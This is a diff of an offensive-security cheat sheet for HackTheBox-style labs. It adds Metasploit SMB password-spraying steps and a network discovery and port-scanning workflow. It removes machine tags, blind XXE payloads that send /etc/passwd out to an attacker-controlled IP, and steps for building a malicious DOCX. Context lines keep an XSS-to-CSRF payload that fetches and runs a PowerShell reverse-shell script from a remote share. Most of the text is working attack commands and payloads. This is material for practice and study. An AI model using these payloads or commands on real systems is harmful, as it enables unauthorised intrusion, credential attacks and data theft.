@@ -225,8 +225,13 @@ root@kali:$ crackmapexec smb -u nullinux_users.txt -p 'qwe123' --shares [--conti
 
 Same password spraying with Metasploit:
 
-* [www.youtube.com/watch?v=fmBb6BgLsC8&t=620](https://www.youtube.com/watch?v=fmBb6BgLsC8&t=620)
-
+```
+msf5 > use auxiliary/scanner/smb/smb_login
+msf5 auxiliary(scanner/smb/smb_login) > setg USER_FILE users.txt
+msf5 auxiliary(scanner/smb/smb_login) > setg PASS_FILE passwords.txt
+msf5 auxiliary(scanner/smb/smb_login) > setg RHOSTS 127.0.0.1
+msf5 auxiliary(scanner/smb/smb_login) > run
+```
 
 
 
@@ -260,7 +265,7 @@ rpcclient $> enumdomgroups
 #### enum4linux
 
 ```
-root@kali:$ enum4linux -v -a 127.0.0.1 | tee nullinux_users.txt
+root@kali:$ enum4linux -v -a 127.0.0.1 | tee enum4linux.txt
 ```
 
 
@@ -363,8 +368,6 @@ PS> Set-acl -aclobject $acl "ad:DC=example,DC=local"
 
 1. [github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md](https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md)
 
-tags: *forest.htb*
-
 #### Mimikatz
 
 ```
@@ -398,8 +401,6 @@ PS> (sc.exe \\<HOSTNAME> stop dns) -and (sc.exe \\<HOSTNAME> start dns)
 3. [ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)
 4. [adsecurity.org/?p=4064](https://adsecurity.org/?p=4064)
 
-tags: *resolute.htb*
-
 
 ### Azure Admins
 
@@ -408,8 +409,6 @@ PS> Azure-ADConnect -server 127.0.0.1 -db ADSync
 
 * [github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1)
 * [blog.xpnsec.com/azuread-connect-for-redteam/](https://blog.xpnsec.com/azuread-connect-for-redteam/)
-
-tags: *moteverde.htb*
 
 
 ### Bloodhound
@@ -533,8 +532,6 @@ PS> cmd /c C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
 * [egre55.github.io/system-properties-uac-bypass](https://egre55.github.io/system-properties-uac-bypass)
 * [www.youtube.com/watch?v=krC5j1Ab44I&t=3570s](https://www.youtube.com/watch?v=krC5j1Ab44I&t=3570s)
 
-tags: *arkham.htb*
-
 
 
 ## AV Bypass
@@ -642,8 +639,6 @@ Or
 PS> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | select DefaultPassword
 ```
 
-tags: *sauna.htb*
-
 
 ### SDDL
 
@@ -701,8 +696,6 @@ root@kali:$ tail -f /var/log/samba/log.<HOSTNAME>
 
 * [www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html](http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html)
 
-tags: *sniper.htb*
-
 
 ### Log Poisoning
 
@@ -730,8 +723,6 @@ root@kali:$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//pr
 
 * [medium.com/bugbountywriteup/bugbounty-journey-from-lfi-to-rce-how-a69afe5a0899](https://medium.com/bugbountywriteup/bugbounty-journey-from-lfi-to-rce-how-a69afe5a0899)
 * [outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1](https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1)
-
-tags: *patents.htb*
 
 
 
@@ -778,8 +769,6 @@ name=snovvcrash&email=admin%example.com++++++++++11&password=qwe123
 ```
 
 * [www.youtube.com/watch?v=F1Tm4b57ors](https://www.youtube.com/watch?v=F1Tm4b57ors)
-
-tags: *book.htb*
 
 
 ### Write File
@@ -846,8 +835,6 @@ xhr.send();
 
 * [www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html)
 
-tags: *book.htb*
-
 #### XSS to CSRF
 
 If the endpoint is accessible only from localhost:
@@ -865,8 +852,6 @@ xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
 xhr.send("cmd=powershell -nop -exec bypass -f  \\\\10.10.15.123\\share\\rev.ps1");
 </script>
 ```
-
-tags: *bankrobber.htb*
 
 With capturing CSRF token first:
 
@@ -886,80 +871,6 @@ function handleResponse() {
 ```
 
 * [portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf)
-
-
-
-## XXE
-
-
-### Blind XXE OOB with External DTD
-
-Way 1 (general entities):
-
-```xml
-<?xml version="1.0"?>
-<!DOCTYPE foo [
-<!ELEMENT foo ANY>
-<!ENTITY % xxe SYSTEM "http://10.10.14.253/ext.dtd">
-%xxe;
-%ext;
-]>
-<foo>&exfil;</foo>
-
---- External file ext.dtd (hosted on local machine) ---
-
-<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
-<!ENTITY % ext "<!ENTITY exfil SYSTEM 'http://10.10.14.253/?x=%file;'>">
-```
-
-Way 2 (parameter entities):
-
-```xml
-<?xml version="1.0"?>
-<!DOCTYPE foo [
-<!ELEMENT foo ANY>
-<!ENTITY % xxe SYSTEM "http://10.10.14.253/ext.dtd">
-%xxe;
-]>
-<foo></foo>
-
---- External file ext.dtd (hosted on local machine) ---
-
-<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
-<!ENTITY % ext "<!ENTITY &#x25; exfil SYSTEM 'http://10.10.14.253/?x=%file;'>">
-%ext;
-%exfil;
-```
-
-* [portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-exfiltrate-data-out-of-band](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-exfiltrate-data-out-of-band)
-* [www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/](https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/)
-* [media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)
-* [medium.com/@klose7/https-medium-com-klose7-xxe-attacks-part-1-xml-basics-6fa803da9f26](https://medium.com/@klose7/https-medium-com-klose7-xxe-attacks-part-1-xml-basics-6fa803da9f26)
-* [mohemiv.com/all/exploiting-xxe-with-local-dtd-files/](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)
-
-
-### Malicious DOC/DOCX
-
-Get `docx` sample and unpack it:
-
-```
-root@kali:$ curl https://file-examples.com/wp-content/uploads/2017/02/file-sample_100kB.docx > sample.docx
-root@kali:$ unzip sample.docx
-```
-
-Create `customXml/` dir with a payload and pack it back:
-
-```
-root@kali:$ mkdir customXml
-root@kali:$ vi item1.xml
-...
-root@kali:$ rm malicious.docx; zip -r malicious.docx '[Content_Types].xml' customXml/ docProps/ _rels/ word/
-```
-
-* [file-examples.com/index.php/sample-documents-download/sample-doc-download/](https://file-examples.com/index.php/sample-documents-download/sample-doc-download/)
-* [stackoverflow.com/a/38797399/6253579](https://stackoverflow.com/a/38797399/6253579)
-
-tags: *patents.htb*
 
 
 
@@ -1059,8 +970,6 @@ $ ./lr -p ./payload -t /home/snovvcrash/backups/access.log -d
 * [tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
 * [popsul.ru/blog/2013/01/post-42.html](https://popsul.ru/blog/2013/01/post-42.html)
 
-tags: *book.htb*
-
 
 ### Windows
 
@@ -1127,8 +1036,6 @@ PS> Get-Service wuauserv
 PS> Stop-Service wuauserv
 ```
 
-tags: *control.htb*
-
 
 
 ## Rootkits
@@ -1138,54 +1045,168 @@ tags: *control.htb*
 
 * [0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485](https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485)
 
-tags: *scavenger.htb*
-
 
 
 ## Enumeration
 
-
-### Ping Sweep
-
 ```
-root@kali:$ NET="0.0.0"; for i in $(seq 1 254); do (ping -c1 -W1 $NET.$i > /dev/null && echo "$NET.$i" |tee -a sweep.txt &); done
-root@kali:$ NET="0.0.0"; for i in $(seq 1 254); do (ping -c1 -W1 "$NET.$i" |grep 'bytes from' |cut -d' ' -f4 |cut -d':' -f1 |tee -a sweep.txt &); done
-
-root@kali:$ sort -t'.' -k4,4n sweep.txt > pingsweep.txt && rm sweep.txt
-```
-
-### Echo Ports
-
-```
-root@kali:$ IP="10.10.10.173"; for p in $(seq 1 65535); do (echo '.' > /dev/tcp/$IP/$p && echo "$IP:$p" >> ports.txt &) 2>/dev/null; done
-
-root@kali:$ sort -t':' -k1,1n ports.txt > echoports.txt && rm ports.txt
+mkdir -p discovery/{subnets,hosts,services} report/{logs,screenshots} exploitation/
 ```
 
 
-### Nmap
+### Host Discovery
 
-Host discovery:
+CWD: `discovery/`
 
-```
-root@kali:$ nmap -n -sn 127.0.0.1/24
-```
+#### Hunt for Subnets
 
-Port scan with masscan first (>= v1.0.6):
+Take `10.0.0.0/8` as an example:
 
 ```
-root@kali:$ masscan --rate=1000 -e tun0 -p1-65535,U:1-65535 127.0.0.1 > ports
+root@kali:$ nmap -n -sn 10.0-255.0-255.1 -oA subnets/gateways -PE --min-rate 10000 --min-hostgroup 10000
+root@kali:$ grep 'Up' subnets/gateways.gnmap |cut -d' ' -f2 > subnets/ranges.txt
+
+root@kali:$ sed -i subnets/ranges.txt -e 's/$/\/24/'
+```
+
+#### Ping Sweep
+
+Bash:
+
+```
+root@kali:$ NET="0.0.0"; for i in $(seq 1 254); do (ping -c1 -W1 $NET.$i > /dev/null && echo "$NET.$i" |tee -a hosts/pingsweep.txt &); done
+Or
+root@kali:$ NET="0.0.0"; for i in $(seq 1 254); do (ping -c1 -W1 "$NET.$i" |grep 'bytes from' |cut -d' ' -f4 |cut -d':' -f1 |tee -a hosts/pingsweep.txt &); done
+
+root@kali:$ sort -u -t'.' -k4,4n hosts/pingsweep.txt > hosts/targets.txt && rm hosts/pingsweep.txt
+```
+
+Nmap:
+
+```
+root@kali:$ nmap -n -sn -iL subnets/ranges.txt -oA hosts/pingsweep -PE
+root@kali:$ grep 'Up' hosts/pingsweep.gnmap |cut -d' ' -f2 |sort -u -t'.' -k1,1n -k2,2n -k3,3n -k4,4n > hosts/targets.txt
+```
+
+#### RMI Sweep
+
+Remote Management Interfaces:
+
+* 22 -- SSH
+* 80 -- HTTP
+* 443 -- SSL/TLS
+* 3389 -- RDP
+* 2222 -- SSH?
+* 5985 -- WinRM (HTTP)
+* 5986 -- WinRM (HTTPS)
+
+Nmap:
+
+```
+root@kali:$ nmap -n -Pn -iL subnets/ranges.txt -oA hosts/rmisweep -p22,80,443,3389,2222,5985,5986 [--min-rate 1280 --min-hostgroup 256]
+root@kali:$ grep 'open' hosts/rmisweep.gnmap |cut -d' ' -f2 |sort -u -t'.' -k1,1n -k2,2n -k3,3n -k4,4n >> hosts/targets.txt
+```
+
+#### DNS Brute
+
+* [github.com/blark/aiodnsbrute](https://github.com/blark/aiodnsbrute)
+
+
+### Services
+
+#### Nmap XML Parsers
+
+`parsenmap.rb`:
+
+```
+root@kali:$ git clone https://github.com/R3dy/parsenmap /opt/parsenmap && cd /opt/parsenmap
+root@kali:$ bundle install && ln -s /opt/parsenmap/parsenmap.rb /usr/local/bin/parsenmap.rb && cd -
+root@kali:$ parsenmap.rb --help
+```
+
+* [github.com/R3dy/parsenmap](https://github.com/R3dy/parsenmap)
+
+`nmaptocsv`:
+
+```
+root@kali:$ git clone https://github.com/maaaaz/nmaptocsv /opt/nmaptocsv && cd /opt/nmaptocsv
+root@kali:$ python3 -m pip install -r requirements.txt csvkit && ln -s /opt/nmaptocsv/nmaptocsv.py /usr/local/bin/nmaptocsv.py && cd -
+root@kali:$ nmaptocsv.py --help
+```
+
+* [github.com/maaaaz/nmaptocsv](https://github.com/maaaaz/nmaptocsv)
+
+#### Ports (Quick)
+
+Echo:
+
+```
+root@kali:$ IP="0.0.0.0"; for p in $(seq 1 65535); do (echo '.' > /dev/tcp/$IP/$p && echo "$IP:$p" >> hosts/ports.txt &) 2>/dev/null; done
+root@kali:$ sort -u -t':' -k1,1n hosts/ports.txt > hosts/echo-ports.txt && rm hosts/ports.txt
+```
+
+Nmap:
+
+```
+root@kali:$ nmap -n -Pn -iL hosts/targets.txt -oA services/?-top-ports [--top-ports ? -T4 --min-rate 1280 --min-hostgroup 256]
+root@kali:$ grep 'open' services/?-top-ports.gnmap
+root@kali:$ parsenmap.rb services/?-top-ports.xml
+root@kali:$ nmaptocsv.py -x services/?-top-ports.xml -d',' -f ip-fqdn-port-protocol-service-version-os |csvlook -I
+
+root@kali:$ nmap -n -Pn -iL hosts/targets.txt -oA services/quick-sweep -p22,25,53,80,443,445,1433,3306,3389,5800,5900,8080,8443 [-T4 --min-rate 1280 --min-hostgroup 256]
+root@kali:$ grep 'open' services/quick-sweep.gnmap
+root@kali:$ parsenmap.rb services/quick-sweep.xml
+root@kali:$ nmaptocsv.py -x services/quick-sweep.xml -d',' -f ip-fqdn-port-protocol-service-version-os |csvlook -I
+```
+
+#### Ports (Full)
+
+```
+root@kali:$ nmap -n -Pn -sV -A -iL hosts/targets.txt -oA services/alltcp-versions -p0-65535 --min-rate 50000 --min-hostgroup 256
+```
+
+Define which NSE scripts ran:
+
+```
+root@kali:$ grep '|_' services/alltcp-versions.nmap |cut -d'_' -f2 |cut -d' ' -f1 |sort -u |grep ':'
+```
+
+Look at HTTP titles:
+
+```
+root@kali:$ grep -i 'http-title' services/alltcp-versions.nmap
+```
+
+qwe:
+
+```
+root@kali:$ parsenmap.rb services/alltcp-versions.xml > services/alltcp-versions.csv
+Or
+nmaptocsv.py -x services/alltcp-versions.xml -d',' -f ip-fqdn-port-protocol-service-version-os > services/alltcp-versions.csv
+```
+
+
+### Tricks
+
+Fast port discovery (Masscan) + versions and NSE scripts (Nmap):
+
+```
+root@kali:$ masscan --rate=1000 -e tun0 -p0-65535,U:0-65535 127.0.0.1 > ports
 root@kali:$ ports=`cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr "\n" ',' | sed 's/,$//'`
 root@kali:$ nmap -n -Pn -sV -sC [-sT] [--reason] -oA nmap/output 127.0.0.1 -p$ports
+root@kali:$ rm ports
 ```
 
-Port scan with fast nmap first:
+Fast port discovery (Nmap) + versions and NSE scripts (Nmap):
 
 ```
 root@kali:$ nmap -n -Pn --min-rate=1000 -T4 127.0.0.1 -p- -vvv | tee ports
 root@kali:$ ports=`cat ports | grep '^[0-9]' | awk -F "/" '{print $1}' | tr "\n" ',' | sed 's/,$//'`
 root@kali:$ nmap -n -Pn -sV -sC [-sT] [--reason] -oA nmap/output 127.0.0.1 -p$ports
+root@kali:$ rm ports
 ```
+
+#### Nmap
 
 DNS brute force:
 
@@ -2290,3 +2311,17 @@ PS> Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion
 ```
 Cmd> VBoxManage.exe dhcpserver add --netname intnet --ip 10.0.1.1 --netmask 255.255.255.0 --lowerip 10.0.1.101 --upperip 10.0.1.254 --enable
 ```
+
+
+
+
+# Useful Links
+
+
+
+## Web Security Academy
+
+* [All learning materials - detailed / Web Security Academy](https://portswigger.net/web-security/all-materials/detailed)
+* [All labs / Web Security Academy](https://portswigger.net/web-security/all-labs)
+* [SQL injection cheat sheet / Web Security Academy](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+* [Cross-Site Scripting (XSS) Cheat Sheet / Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
